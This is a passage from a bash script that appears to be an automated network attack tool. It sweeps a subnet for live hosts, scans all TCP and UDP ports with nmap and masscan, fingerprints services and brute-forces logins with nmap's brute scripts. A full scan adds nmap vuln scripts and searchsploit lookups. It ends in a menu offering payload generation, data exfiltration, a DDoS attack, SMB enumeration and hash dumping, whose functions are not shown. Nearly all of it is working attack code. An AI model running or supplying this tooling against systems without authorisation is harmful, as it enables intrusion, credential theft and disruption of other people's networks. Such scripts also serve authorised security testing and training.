    touch $dir_name/$current_datetime+$log_file_name
    log_output "Log file created at: $dir_name/$current_datetime+$log_file_name"
fi

echo "Scanning for all live hosts:"
#first step: find all available ip addresses within the range, excluding hosts' ip
#finding host's ip address
echo "Scanning for available live hosts"
host_ip=$(ip addr show eth0 | grep "inet " | awk '{print $2}' | awk -F/ '{print $1}')
echo "current host's ip address is:" $host_ip
#next, scan network for live hosts, excluding the current host, save that under dir_name
nmap -n -sn $network -oG - --stats-every $nmap_stats_timing | awk '/Up$/{print $2}' | grep -v $host_ip > $dir_name/$current_datetime+$target_file_name
echo "Currently live hosts' ip addresses are:"
cat $dir_name/$current_datetime+$target_file_name
log_output "Currently live hosts' ip addresses are saved at: $dir_name/$current_datetime+$target_file_name"
echo $breakpoint
echo "Scanning all live hosts' available TCP ports..."
log_output "Scanning all live hosts' available TCP ports"
nmap -sS -Pn -p- -iL  $dir_name/$current_datetime+$target_file_name --open -oG $dir_name/$current_datetime+$tcp_ports_file_name --stats-every $nmap_stats_timing
echo $breakpoint
echo "Scanning all live hosts' available UDP ports..."
log_output "Scanning all live hosts' available UDP ports"
masscan -iL $dir_name/$current_datetime+$target_file_name -pU:1-65535 --rate:5000 -oG $dir_name/$current_datetime+$udp_ports_file_name
tcp_ports=$(cat $dir_name/$current_datetime+$tcp_ports_file_name | grep "open" | awk -F'\t' '{print $2}' | grep -o -E '[0-9]+' | sort -n | uniq | tr '\n' ',')
udp_ports=$(cat $dir_name/$current_datetime+$udp_ports_file_name | grep "open" | awk '{print $7}' | awk -F/ '{print $1}' | sort -n | uniq | tr '\n' ',')
echo "All available TCP ports are: ${tcp_ports:0:-1}"
echo "All available UDP ports are: ${udp_ports:0:-1}"
log_output "All available TCP ports are: ${tcp_ports:0:-1}"
log_output "TCP ports saved at: $dir_name/$current_datetime+$tcp_ports_file_name"
log_output "All available UDP ports are: ${udp_ports:0:-1}"
log_output "UDP ports saved at: $dir_name/$current_datetime+$udp_ports_file_name"
echo $breakpoint
echo "Service Version Scan of all ports."
#note that this is saved in .xml format for searchsploit vulnerability scanning.
nmap -O -sV -sT -sU -iL $dir_name/$current_datetime+$target_file_name -p U:$(echo $udp_ports)T:$tcp_ports --open -oX $dir_name/$current_datetime+$service_version_file_name --stats-every $nmap_stats_timing
log_output "Service version scanning saved at: $dir_name/$current_datetime+$service_version_file_name"
echo $breakpoint
echo "Simple weak password checking of all possible logins:"
if [[ -z $udp_ports ]]; then
    nmap -iL $dir_name/$current_datetime+$target_file_name -T4 -p $tcp_ports --open -oG $dir_name/$current_datetime+$weak_passwords_file_name --stats-every $nmap_stats_timing --script-timeout=120s --script=brute --script-args "userdb=$username_file,passdb=$password_short_file,unpwdb.timelimit=120s"
else
    nmap -iL $dir_name/$current_datetime+$target_file_name -T4 -p U:$(echo $udp_ports)T:$tcp_ports --open -oG $dir_name/$current_datetime+$weak_passwords_file_name --stats-every $nmap_stats_timing --script-timeout=120s --script=brute --script-args "userdb=$username_file,passdb=$password_short_file,unpwdb.timelimit=120s,backorifice-brute.ports=U:${udp_ports:0:-1}"
fi
log_output "Simple weak password checking saved at: $dir_name/$current_datetime+$weak_passwords_file_name"
#run this if 'f' is requested.:
echo $breakpoint
if [[ $scan_type == "f" ]]; then
    echo "Full scan requested: Simple vulnerability checking of all available services:"
    nmap -iL $dir_name/$current_datetime+$target_file_name -T4 -p U:$(echo $udp_ports)T:$tcp_ports --script=vuln -oG $dir_name/$current_datetime+$vulnerabilities_file_name --stats-every $nmap_stats_timing --script-timeout=60s
    searchsploit --nmap $dir_name/$current_datetime+$service_version_file_name > $dir_name/$current_datetime+"searchsploit"+$vulnerabilities_file_name
    cat $dir_name/$current_datetime+"searchsploit"+$vulnerabilities_file_name
    echo $breakpoint
    log_output "nmap vulernabilites checking saved at: $dir_name/$current_datetime+$vulnerabilities_file_name"
    log_output "searchsploit vulernabilites checking saved at: $dir_name/$current_datetime+"searchsploit"+$vulnerabilities_file_name"
fi

echo $breakpoint
while [ $optionChosen -ne 8 ]
do
    read -p "$__optionsMenu" -a optionChosen
    if [[ ! $optionChosen =~ ^[0-9]+$ ]]; then #input is not a number
        echo "[!] Input given is not a number. Please try again."
        optionChosen=0
    else
        case $optionChosen in
            1)
                echo "Weak login credentials chosen"
                weak_credentials
                ;;
            2)
                echo "Creating Resource File chosen"
                resource_file
                optionChosen=2
                ;;
            3)
                echo "Generate Payload chosen"
                generate_payload
                ;;
            4)
                echo "Data Exfiltration chosen"
                data_exfiltration
                ;;
            5)
                echo "DDOS attack chosen"
                ddos_attack
                ;;
            6)
                echo "SMB shares enumration chosen"
                smb_enum
                ;;
            7)
                echo "Dump hashes"
                impacket_hashdump
                ;;
            8)
                echo "Exit chosen"
                echo "Thank you for using my program!"
                echo "What you done for this session: "
                cat $dir_name/$current_datetime+$log_file_name
                ;;
            *)
                echo "Unknown option chosen. Please try again."
                ;;
        esac
    fi
    echo $breakpoint
done